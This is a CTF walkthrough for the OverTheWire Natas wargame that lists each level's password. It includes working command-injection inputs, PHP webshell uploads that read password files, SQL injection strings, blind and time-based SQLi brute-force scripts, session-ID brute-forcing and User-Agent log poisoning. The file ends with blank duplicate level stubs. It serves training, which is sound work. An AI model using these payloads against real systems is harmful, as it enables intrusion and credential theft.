# Natas Solutions

http://natas0.natas.labs.overthewire.org

### Level 0 `natas0`
- Second Click. Inspect Element.
- Password for next level is hidden in comments in div#content.

### Level 1 `gtVrDuiDfck831PqWsLEZy5gyDz1clto`
- Ctrl+Shift+I
- Password for next level is hidden in comments in div#content.

### Level 2 `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`
- Ctrl+Shift+I
- There's a file used in div#content at /files/pixel.png. So we try going to /files
- We see a users.txt in which there's the password for next level.

### Level 3 `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`
- Apparently there's a file called robots.txt which prevents web crawlers/bots to index certain pages/routes. So we try to open that (/robots.txt).
- Here we see a diallowed path (/s3cr3t/). We go there and open the users.txt file to get the password for the next level.

### Level 4 `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`
- Go to natas5 page.
- Cancel the credentials alert.
- Open console.
```javascript
window.location = "http://natas4.natas.labs.overthewire.org/"
```
- Press Enter

### Level 5 `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`
- Open DevTools (Application tab)
- Open cookies. There's a variable with name "loggedin" and value 0.
- Change that value to 1.
- The password appears.

### Level 6 `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`
- Click on View Source
- There's a little PHP code, understand what it does.
- open the file /includes/secret.inc
- copy the secret value and paste it in the input box.
- It gives the password.

### Level 7 `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
- Open dev tools to find out that the index.php?path=[path_name] opens the file at path name.
- See the hint that tells the location of the file where the password is stored. (/etc/natas_webpass/natas8)
- Open this file with index.php (/index.php?page=/etc/natas_webpass/natas8)

### Level 8 `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`
- Click on View Source. Understand the PHP Code.
- We realise that we need to find the: 
```php
base64_decode(strrev(hex2bin( "3d3d516343746d4d6d6c315669563362" )));
```
- It is "oubWYf2kBq"
- Paste this in input box.
- It gives the password.

### Level 9 `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
- Open the source code and understand what php is doing.
- We see that php is clearly running the command directly we enter in it's shell between "grep -i " and " dictionary.txt"
- At the first look it looks like we'll find the password in dictionary.txt, but we wont.
- We can directly get it from /etc/natas_webpass/
- So we enter this in the textbox;
```
; cat /etc/natas_webpass/natas10;
```
- And we get the password for level 10.

### Level 10 `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
- Read php part of source-code to understand which characters are not allowed.
```
-e "." /etc/natas_webpass/natas11 #
```

### Level 11 `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`
- Understand the PHP code.
- We see that there is no way we can give any input from HTML that could change the variable `showpassword` in PHP, unless we change the cookie value itself.
- To change the cookie value though, we need the secret key. Which we can get because of the following XOR property
```
If A^B = C,
Then A^C = B = C^A
And B^C = A = C^B
```
- So we use the following PHP code to find the key (and verify that it is actually the correct key):
- ***Notice that we've replaced URL encoded "%3D" (in cookie value) to ASCII "="***
```php
<?php

function xor_encrypt($in, $ke) {
    $key = $ke;
    $text = $in;
    $outText = '';
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

$cook = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
$mykey = base64_decode($cook);
$actualkey = xor_encrypt(json_encode($defaultdata), $mykey);
print $actualkey;
print " --- ";
print base64_encode(xor_encrypt(json_encode($defaultdata), $actualkey));
?>

// Outputs: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq --- ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```
- Based on the output `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`, it can be assumed that the secret key is `qw8J`.
- Now we generate an xor-encrypted cookie value using this secret key, in which showpassword's value is "yes", using the following PHP code:
```php
<?php
function xor_encrypt($in, $ke) {
    $key = $ke;
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

$actualkey = "qw8J";
$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#00ff00");
print base64_encode(xor_encrypt(json_encode($defaultdata), $actualkey));

// Outputs - ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVAh6FxEIelMK
?>
```
- We replace the cookie value in dev-tools and refresh.

### Level 12 `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`
- We see that we can upload a file then open it.
- Also we can change the extension of uploaded the file by changing the hidden input tag (filename).
- So we'll create a php file (that executes a system command and echos the result):
```
echo "<?php echo system(\"cat /etc/natas_webpass/nats13\"); ?>" > script.php
```
- We'll change the upload file type to php by changing the "value" of the input tag -> "filename".
- We'll upload the script.php file and open the link.
- We get the password.

### Level 13 `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
- We see that there's a php function `exif_imagetype` being used to verify the file we upload.
- We google to see what it does and find out that it "reads the first bytes of an image and checks its signature".
- We find the signature of jpg file from [wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures): `FF D8 FF E0 00 10 4A 46 49 46 00 01`.
- We create our own file:
```
echo -e '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01 --- <?php echo system("cat /etc/natas_webpass/natas14"); ?>' > test
```
- We'll change the upload file type to php by changing the "value" of the input tag -> "filename".
- We upload the test file and open the php page link to get the password.

### Level 14 `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`
- We see that a query is created the values we enter in the textboxes.
- In the form's action property, we change the value from "index.php" to "index.php?debug=1" to trigger the sql output.
- We enter `natas" or username like "%" -- ` in username box and nothing in password is required because the rest of the query is commented.
- The following query gets executed:
```sql
SELECT * from users where username="natas" or username like "%" -- " and password=""
```
- We get the password.

### Level 15 `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
- The php code basically checks for the presence of a user in the database. What's different is that this time we're given the table name and column names as well.
- Since there's other info available we try for the user `natas16` and we actually see that this user exists.
- Again due to the lack of possiblities, it is safe to assume that the password associated with user `natas16` is actuall the password for the next level.
- Since there's no way to actually get the output of the SQL Query (other than a boolean of wheather user exists or not) we have to brute-force the password out of the database.
- I'm brute-forcing it with Node.js:
```javascript
const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

const headers = {
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
}
async function req(ch) {
    const res = await axios.post('http://natas15.natas.labs.overthewire.org/index.php', `username=natas16%22+and+password+like+binary+%22${ch}%25`, {headers});
    if(res.data.includes('This user exists.')) {
        return true;
    } else {
        return false;
    }
}

async function calc() {
    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
    let ans = '';
    
    for(let i=0; i<alphanum.length; i++) {
        let val = await req(ans + alphanum[i]);
        if(val) {
            ans += alphanum[i];
            console.log(ans);
            i = -1;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

// Outputs
// Example app listening at http://localhost:3000
// W
// Wa
// WaI
// WaIH
// WaIHE
// WaIHEa
// WaIHEac
// WaIHEacj
// WaIHEacj6
// WaIHEacj63
// WaIHEacj63w
// WaIHEacj63wn
// WaIHEacj63wnN
// WaIHEacj63wnNI
// WaIHEacj63wnNIB
// WaIHEacj63wnNIBR
// WaIHEacj63wnNIBRO
// WaIHEacj63wnNIBROH
// WaIHEacj63wnNIBROHe
// WaIHEacj63wnNIBROHeq
// WaIHEacj63wnNIBROHeqi
// WaIHEacj63wnNIBROHeqi3
// WaIHEacj63wnNIBROHeqi3p
// WaIHEacj63wnNIBROHeqi3p9
// WaIHEacj63wnNIBROHeqi3p9t
// WaIHEacj63wnNIBROHeqi3p9t0
// WaIHEacj63wnNIBROHeqi3p9t0m
// WaIHEacj63wnNIBROHeqi3p9t0m5
// WaIHEacj63wnNIBROHeqi3p9t0m5n
// WaIHEacj63wnNIBROHeqi3p9t0m5nh
// WaIHEacj63wnNIBROHeqi3p9t0m5nhm
// WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
// fin
```
- This solution can further be improved (made faster) by two ways:
    - binary-searching for characters (using strcmp function in sql)
    - Finding all the characters present in the password beforehand (by using %ch%)

### Level 16 `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`
- Given the character we're not allowed to use, our only choice is to nest a command inside the grep paramter.
- So what we'll do is we'll submit this in the box:
```
submit$(grep -e ^a /etc/natas_webpass/natas17)
```
- If the password of natas17 begins with a, our nested block will be replaced by the actual password and there will be now output, because the outer command will end up grepping submit*some-gibberish*
- On the other hand if the password of natas17 doesn't begin with a, out nested block will be replace with a blank string and the outer command will return a bunch of words (having 'submit' in them).
- We'll use this technique to brute-force the password out:
```javascript
const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

const headers = {
    'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='
}
async function req(ch) {
    const res = await axios.get(`http://natas16.natas.labs.overthewire.org/?needle=submit%24%28grep+-e+%5E${ch}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search`, {headers});
    if(res.data.includes('resubmitting')) {
        return false;
    } else {
        return true;
    }
}

async function calc() {
    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
    let ans = '';
    
    for(let i=0; i<alphanum.length; i++) {
        let val = await req(ans + alphanum[i]);
        if(val) {
            ans += alphanum[i];
            console.log(ans);
            i = -1;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

// Outputs:
// Example app listening at http://localhost:3000
// 8
// 8P
// 8Ps
// 8Ps3
// 8Ps3H
// 8Ps3H0
// 8Ps3H0G
// 8Ps3H0GW
// 8Ps3H0GWb
// 8Ps3H0GWbn
// 8Ps3H0GWbn5
// 8Ps3H0GWbn5r
// 8Ps3H0GWbn5rd
// 8Ps3H0GWbn5rd9
// 8Ps3H0GWbn5rd9S
// 8Ps3H0GWbn5rd9S7
// 8Ps3H0GWbn5rd9S7G
// 8Ps3H0GWbn5rd9S7Gm
// 8Ps3H0GWbn5rd9S7GmA
// 8Ps3H0GWbn5rd9S7GmAd
// 8Ps3H0GWbn5rd9S7GmAdg
// 8Ps3H0GWbn5rd9S7GmAdgQ
// 8Ps3H0GWbn5rd9S7GmAdgQN
// 8Ps3H0GWbn5rd9S7GmAdgQNd
// 8Ps3H0GWbn5rd9S7GmAdgQNdk
// 8Ps3H0GWbn5rd9S7GmAdgQNdkh
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
// fin
```

### Level 17 `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`
- It's apparent that there's no way we can get the code to print anything other that the query being executed. (The lines of code are commented, we cannont change that.)
- So we need to use the time based approach of SQL Injection to find the password. Try to following input:
```
natas18" and sleep(10) -- 
```
- We notice that there's a 10 second delay in the response. Now let's try with something that we know for sure is not present in the database, to make sure this works.
```
ankush" and sleep(10) -- 
```
- There's no delay in the response so the time based approach is working. We can now add the password we need to find for the user "natas18"
```
natas18" and password like "%" and sleep(10) -- 
```
- Ten second delay is noticed. Perfect now we need a script to brute-force the password out, much like natas15:
```javascript
const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

const headers = {
    'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
}
async function req(ch) {
    let aTime = new Date();
    const res = await axios.post(`http://natas17.natas.labs.overthewire.org/index.php`, `username=natas18%22+and+password+like+binary+%22${ch}%25%22+and+sleep%285%29+--+`, {headers});
    let bTime = new Date();
    let diff = (bTime.getTime() - aTime.getTime()) / 1000;
    if(diff >= 5) {
        return true;
    } else {
        return false;
    }
}

async function calc() {
    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
    let ans = '';
    
    for(let i=0; i<alphanum.length; i++) {
        let val = await req(ans + alphanum[i]);
        if(val) {
            ans += alphanum[i];
            console.log(ans);
            i = -1;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

// Outputs:
// Example app listening at http://localhost:3000
// x
// xv
// xvK
// xvKI
// xvKIq
// xvKIqD
// xvKIqDj
// xvKIqDjy
// xvKIqDjy4
// 0xvKIqDjy4O
// xvKIqDjy4OP
// xvKIqDjy4OPv
// xvKIqDjy4OPv7
// xvKIqDjy4OPv7w
// xvKIqDjy4OPv7wC
// xvKIqDjy4OPv7wCR
// xvKIqDjy4OPv7wCRg
// xvKIqDjy4OPv7wCRgD
// xvKIqDjy4OPv7wCRgDl
// xvKIqDjy4OPv7wCRgDlm
// xvKIqDjy4OPv7wCRgDlmj
// xvKIqDjy4OPv7wCRgDlmj0
// xvKIqDjy4OPv7wCRgDlmj0p
// xvKIqDjy4OPv7wCRgDlmj0pF
// xvKIqDjy4OPv7wCRgDlmj0pFs
// xvKIqDjy4OPv7wCRgDlmj0pFsC
// xvKIqDjy4OPv7wCRgDlmj0pFsCs
// xvKIqDjy4OPv7wCRgDlmj0pFsCsD
// xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
// xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
// xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
// xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
// fin
```

### Level 18 `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`
- Understanding the code, it's apparent that not a lot can be done/manipulated.
- We cannot get admin's credentials, unless we hit it's session.
- So we brute-force with all session IDs until we actuall hit it, using the following script:
```javascript
const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

async function req(ch) {
    const headers = {
        'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
        'Cookie': `PHPSESSID=${ch}`
    }
    const res = await axios.post(`http://natas18.natas.labs.overthewire.org/index.php?debug=1`, `username=natas19`, {headers, withCredentials: true});
    console.log(`For sessionId = ${ch}`);
    if(res.data.includes('regular')) {
        return false;
    } else {
        console.log(res.data);
        return true;
    }
}

async function calc() {
    for(let i=1; i<=640; i++) {
        let val = await req(i);
        if(val) {
            break;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

// Outputs:
// Example app listening at http://localhost:3000
// For sessionId = 1
// For sessionId = 2
// For sessionId = 3
// For sessionId = 4
// For sessionId = 5
// For sessionId = 6
// For sessionId = 7
// For sessionId = 8
// For sessionId = 9
// For sessionId = 10
// For sessionId = 11
// For sessionId = 12
// For sessionId = 13
// For sessionId = 14
// For sessionId = 15
// For sessionId = 16
// For sessionId = 17
// For sessionId = 18
// For sessionId = 19
// For sessionId = 20
// For sessionId = 21
// For sessionId = 22
// For sessionId = 23
// For sessionId = 24
// For sessionId = 25
// For sessionId = 26
// For sessionId = 27
// For sessionId = 28
// For sessionId = 29
// For sessionId = 30
// For sessionId = 31
// For sessionId = 32
// For sessionId = 33
// For sessionId = 34
// For sessionId = 35
// For sessionId = 36
// For sessionId = 37
// For sessionId = 38
// For sessionId = 39
// For sessionId = 40
// For sessionId = 41
// For sessionId = 42
// For sessionId = 43
// For sessionId = 44
// For sessionId = 45
// For sessionId = 46
// For sessionId = 47
// For sessionId = 48
// For sessionId = 49
// For sessionId = 50
// For sessionId = 51
// For sessionId = 52
// For sessionId = 53
// For sessionId = 54
// For sessionId = 55
// For sessionId = 56
// For sessionId = 57
// For sessionId = 58
// For sessionId = 59
// For sessionId = 60
// For sessionId = 61
// For sessionId = 62
// For sessionId = 63
// For sessionId = 64
// For sessionId = 65
// For sessionId = 66
// For sessionId = 67
// For sessionId = 68
// For sessionId = 69
// For sessionId = 70
// For sessionId = 71
// For sessionId = 72
// For sessionId = 73
// For sessionId = 74
// For sessionId = 75
// For sessionId = 76
// For sessionId = 77
// For sessionId = 78
// For sessionId = 79
// For sessionId = 80
// For sessionId = 81
// For sessionId = 82
// For sessionId = 83
// For sessionId = 84
// For sessionId = 85
// For sessionId = 86
// For sessionId = 87
// For sessionId = 88
// For sessionId = 89
// For sessionId = 90
// For sessionId = 91
// For sessionId = 92
// For sessionId = 93
// For sessionId = 94
// For sessionId = 95
// For sessionId = 96
// For sessionId = 97
// For sessionId = 98
// For sessionId = 99
// For sessionId = 100
// For sessionId = 101
// For sessionId = 102
// For sessionId = 103
// For sessionId = 104
// For sessionId = 105
// For sessionId = 106
// For sessionId = 107
// For sessionId = 108
// For sessionId = 109
// For sessionId = 110
// For sessionId = 111
// For sessionId = 112
// For sessionId = 113
// For sessionId = 114
// For sessionId = 115
// For sessionId = 116
// For sessionId = 117
// For sessionId = 118
// For sessionId = 119
// <html>
// <head>
// <!-- This stuff in the header has nothing to do with the level -->
// <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
// <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
// <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
// <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
// <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
// <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
// <script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
// <body>
// <h1>natas18</h1>
// <div id="content">
// DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
// Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
// </div>
// </body>
// </html>

// fin
```

### Level 19 `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`
- The PHPSESSID is not sequential this time. So we try to see a few different PHPSESSID for no username.
- We see that the PHPSESSID always ends with `2d` which is hexcode for ascii `-`.
- Also notice that it says, we have to login as admin, which makes it pretty safe to assume that the username has to be `admin`.
- Also the one thing to notice is that as soon as we add the username admin, the PHPSESSID starts always ending in `2d61646d696e` which is hexcode for ascii `-admin`.
- Also the prefix to `2d61646d696e` is always of the type `3x3y3z`, which makes it safe to assume that this is the sessionId ascii converted to hexcode.
- So now that we've broken their code, we'll brute-force all the PHPSESSIDs for username admin:
```javascript
const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

function gen(num) {
    let ch = num.toString();
    let x = '';
    for(let i=0; i<ch.length; i++) {
        x += '3';
        x += ch[i];
    }
    return x;
}

async function req(ch) {
    const headers = {
        'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
        'Cookie': `PHPSESSID=${gen(ch)}2d61646d696e`
    }
    const res = await axios.post(`http://natas19.natas.labs.overthewire.org/index.php?debug=1`, `username=admin&password=`, {headers, withCredentials: true});
    console.log(`For try #${ch}`);
    if(res.data.includes('regular')) {
        // console.log(res.data);
        return false;
    } else {
        console.log(res.data);
        return true;
    }
}

async function calc() {
    for(let i=1; i<=640; i++) {
        let val = await req(i);
        if(val) {
            break;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

// Outputs:
// Example app listening at http://localhost:3000
// For try #1
// For try #2
// For try #3
// For try #4
// For try #5
// For try #6
// For try #7
// For try #8
// For try #9
// For try #10
// For try #11
// For try #12
// For try #13
// For try #14
// For try #15
// For try #16
// For try #17
// For try #18
// For try #19
// For try #20
// For try #21
// For try #22
// For try #23
// For try #24
// For try #25
// For try #26
// For try #27
// For try #28
// For try #29
// For try #30
// For try #31
// For try #32
// For try #33
// For try #34
// For try #35
// For try #36
// For try #37
// For try #38
// For try #39
// For try #40
// For try #41
// For try #42
// For try #43
// For try #44
// For try #45
// For try #46
// For try #47
// For try #48
// For try #49
// For try #50
// For try #51
// For try #52
// For try #53
// For try #54
// For try #55
// For try #56
// For try #57
// For try #58
// For try #59
// For try #60
// For try #61
// For try #62
// For try #63
// For try #64
// For try #65
// For try #66
// For try #67
// For try #68
// For try #69
// For try #70
// For try #71
// For try #72
// For try #73
// For try #74
// For try #75
// For try #76
// For try #77
// For try #78
// For try #79
// For try #80
// For try #81
// For try #82
// For try #83
// For try #84
// For try #85
// For try #86
// For try #87
// For try #88
// For try #89
// For try #90
// For try #91
// For try #92
// For try #93
// For try #94
// For try #95
// For try #96
// For try #97
// For try #98
// For try #99
// For try #100
// For try #101
// For try #102
// For try #103
// For try #104
// For try #105
// For try #106
// For try #107
// For try #108
// For try #109
// For try #110
// For try #111
// For try #112
// For try #113
// For try #114
// For try #115
// For try #116
// For try #117
// For try #118
// For try #119
// For try #120
// For try #121
// For try #122
// For try #123
// For try #124
// For try #125
// For try #126
// For try #127
// For try #128
// For try #129
// For try #130
// For try #131
// For try #132
// For try #133
// For try #134
// For try #135
// For try #136
// For try #137
// For try #138
// For try #139
// For try #140
// For try #141
// For try #142
// For try #143
// For try #144
// For try #145
// For try #146
// For try #147
// For try #148
// For try #149
// For try #150
// For try #151
// For try #152
// For try #153
// For try #154
// For try #155
// For try #156
// For try #157
// For try #158
// For try #159
// For try #160
// For try #161
// For try #162
// For try #163
// For try #164
// For try #165
// For try #166
// For try #167
// For try #168
// For try #169
// For try #170
// For try #171
// For try #172
// For try #173
// For try #174
// For try #175
// For try #176
// For try #177
// For try #178
// For try #179
// For try #180
// For try #181
// For try #182
// For try #183
// For try #184
// For try #185
// For try #186
// For try #187
// For try #188
// For try #189
// For try #190
// For try #191
// For try #192
// For try #193
// For try #194
// For try #195
// For try #196
// For try #197
// For try #198
// For try #199
// For try #200
// For try #201
// For try #202
// For try #203
// For try #204
// For try #205
// For try #206
// For try #207
// For try #208
// For try #209
// For try #210
// For try #211
// For try #212
// For try #213
// For try #214
// For try #215
// For try #216
// For try #217
// For try #218
// For try #219
// For try #220
// For try #221
// For try #222
// For try #223
// For try #224
// For try #225
// For try #226
// For try #227
// For try #228
// For try #229
// For try #230
// For try #231
// For try #232
// For try #233
// For try #234
// For try #235
// For try #236
// For try #237
// For try #238
// For try #239
// For try #240
// For try #241
// For try #242
// For try #243
// For try #244
// For try #245
// For try #246
// For try #247
// For try #248
// For try #249
// For try #250
// For try #251
// For try #252
// For try #253
// For try #254
// For try #255
// For try #256
// For try #257
// For try #258
// For try #259
// For try #260
// For try #261
// For try #262
// For try #263
// For try #264
// For try #265
// For try #266
// For try #267
// For try #268
// For try #269
// For try #270
// For try #271
// For try #272
// For try #273
// For try #274
// For try #275
// For try #276
// For try #277
// For try #278
// For try #279
// For try #280
// For try #281
// <html>
// <head>
// <!-- This stuff in the header has nothing to do with the level -->
// <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
// <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
// <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
// <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
// <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
// <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
// <script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
// <body>
// <h1>natas19</h1>
// <div id="content">
// <p>
// <b>
// This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
// </b>
// </p>
// DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
// Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
// </body>
// </html>

// fin
- Which gives us the password for the next level.
```

### Level 20 `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`
- Here's what we know by reading the code:
    - So basically there's a file that gets created corresponding to a session that stores all the variables in the session.
    - If a file for a particular sessionId already exists then the session variables are loaded from that file.
    - And if $_SESSION has a key:value admin:1, then we get our password.
- So let's backtrack. 
    - We need the $_SESSION to have a key:value admin:1.
    - The $_SESSION reads it's variables from a file. (if it already exists)
    - We can create such files. But we can only add the property name.
    - So somehow we need to use this write to fill in the admin:1 key:value.
- Lucky for us, The file is being stored in a line-by-line, space-separated format. So if we pass `random_name\nadmin 1` to the name variable. Then it'll store this value in the file such that the file will look like this:
```
name random_name
admin 1
```
- Which when read, will read 2 separate variables.
- So to do this, call the url `http://natas20.natas.labs.overthewire.org/?debug=1&name=random_name%0Aadmin%201`. Here `%0A` is the URL encoded character for new-line (\n).
- This would have saved the file. 
- Now we reload the same URL. And this time the same file would have been read. So we get the password.

### Level 21 `IFekPyrQXftziDEsUr3x21sYuahypdgJ`
- It is given that the two pages a colocated. Which means that they can have a common session pool. So it is safe to assume that we can make changes in one page's session and then these changes will be visible in the other page (if we are able to open the same session in the other page as well).
- Opening the same session in the other page is easy. Just need to copy the PHPSESSID from the cookies of one page to another.
- Now the main page, which can show us the password we need, is pretty solid, nothing we can do here.
- The css-experimenter page however, is doing a lot of stuff. However only the first 4 lines of the PHP code are all we need to focus on.
- They're essentially setting all the values we submit in the form to the `$_SESSION` array.
- So we can simply open the elements tab of the Chrome Dev tools, add a input tag (in the form) there:
```html
<input name="admin" value="1">
```
- Then simply click 'update' on the UI, this will trigger the submit and add the `{admin=1}` to the `$_SESSION` as we needed.
- Now just open this session in the main page (by copying the PHPSESSID value from the cookies of this page to that of the main page) and password will be visible.

### Level 22 `chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ`
- The code is simple this time, it simply says that if your GET request has a parameter `revelio`, then it'll show the password.
- But the catch is that it is setting a Response Header "Location: /". Which makes the browser redirect the page back to root as soon as response is received.
- So we open postman, turn of the "Automatically follow redirects" option and then send the request with revelio parameter in postman.
- We get a 302 response but in the response body, there's the password.

### Level 23 `D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE`
- All we need to do is to enter the nested if block which has two ANDed conditions.
- The `strstr($haystack, $needle)` function part will easily be true if our string contains 'iloveyou'.
- The second part is a string comparision. String comparisions in PHP are lexicographic. So `"120" < "20" < "3"`.
- Therefore we enter `21iloveyoubro` in the input field and submit.

### Level 24 `OsRmXFguozKpTZZ5X14zNO43379LZveg`
- Since there is a NOT (!) operator in the nested if, we need the `strcmp($str1, $str2)` return value to be exactly 0 (zero), which is only possible if both `$str1` and `$str2` are equal (Not really though).
- Actually the strcmp will return `NULL` if `$str1` is array() (it is safe to assume that `$str2` is string) with a warning. And in PHP `!NULL = true`.
- So in the url we change `/?passwd=ankush` to `/?passwd[]=ankush`.
- And there's our our password, under the warning.

### Level 25 `GHF6X7YwACaYYssHVY05cFq83hRktl4c`
- So there's no way we're embedding `natas_webpass` in the URL. But we can bypass the `../` filter. By simply using `....//` in place of `../`.
- Also there's an unsanitized HTTP_USER_AGENT header being directly logged into the log file in logRequest function.
- So we can embedd php code in that header which will then get inside the log file. And then we can open the log file from index.php as a language file.
- So we hit this URL:
```
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_spc3j918a4fviflemtaf8205e2.log
```
- With the following Headers:
```
User-Agent: <?php global $__MSG; $__MSG=file_get_contents("/etc/natas_webpass/natas26") ?>
Cookie: [copied from browser] [should be the same as the log file in the URL]
Authorization: [copied from browser]
```
- And there's our password for natas26.

### Level 26 `oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`
-

### Level 21 ``
-

### Level 21 ``
-

### Level 21 ``
-

